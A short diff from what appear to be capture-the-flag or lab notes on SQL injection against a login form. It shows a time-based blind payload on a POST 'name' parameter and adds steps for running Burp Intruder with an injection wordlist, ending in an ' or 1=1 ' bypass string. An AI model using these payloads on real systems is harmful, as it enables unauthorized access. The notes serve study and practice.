@@ -141,6 +141,14 @@ Parameter: name (POST)
     Payload: name=123' AND (SELECT 5289 FROM (SELECT(SLEEP(5)))Ilbn) OR 'lkkl'='qLhh&pass=123
 
 
+we can also use burp directly for sql injection
+1. proxy the post
+2. send that to intruder
+3. setup position, Sniper attack,  we can Clear, and highlight the field then Add
+4. setup the payload, payload option -> Load /usr/share/wordlist/wfuzz/injection/SQL.txt
+5. start the attack, find that 200 one
+6. ' or 1=1 or ''='
+
 name: admin
 
 name: thrasivoulos
